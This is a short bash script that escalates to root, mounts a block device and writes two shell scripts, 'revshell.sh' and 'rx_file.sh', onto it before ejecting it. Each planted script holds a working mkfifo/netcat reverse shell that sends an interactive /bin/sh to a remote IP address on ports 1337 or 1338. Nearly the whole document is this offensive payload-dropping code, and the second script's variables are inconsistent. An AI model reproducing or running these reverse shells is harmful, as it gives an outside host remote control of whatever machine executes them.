#!/usr/bin/env bash

set -eu
if [[ $EUID -ne 0 ]]; then
    exec sudo bash "$0" "$@"
fi

HOST_IP=$(hostname -i | awk '{ print $1; }')
RS_PORT=1337
RF_PORT=1338
IO_PORT=1339

RS_BOOK="#!/bin/sh\n# Name: revshell\n# Author: em\n\necho 'loading...'\nsleep 5\n\nHOST_IP=10.165.55.11\nHOST_PORT=1337\n\necho \"-- ip diag --\"\nip addr\necho '' >&2\n\necho \"-- load revshell --\" >&2\necho \"    target $HOST_IP:$RS_PORT\" >&2\necho \"    timeout 30s\" >&2\nrm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | tee /dev/fd/2 | nc -w 30 $HOST_IP $RS_PORT > /tmp/f"
RF_BOOK="#!/bin/sh\n# Name: rx file\n# Author: em\n\nRX_IP=10.253.152.12\nRX_PORT=1338\n\necho \"-- rx executable --\" >&2\necho \"   origin $HOST_IP:$RF_PORT\" >&2\necho \"   timeout 30s\" >&2\nrm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | tee /dev/fd/2 | nc -w 30 $HOST_IP $RF_PORT > /tmp/f"

BLK=$1
if [[ -z $BLK ]]; then 
    BLK="/dev/sda1"
fi;

sudo mount $BLK /mnt
sudo echo -e $RS_BOOK > /mnt/documents/revshell.sh
sudo echo -e $RF_BOOK > /mnt/documents/rx_file.sh
sudo eject /mnt
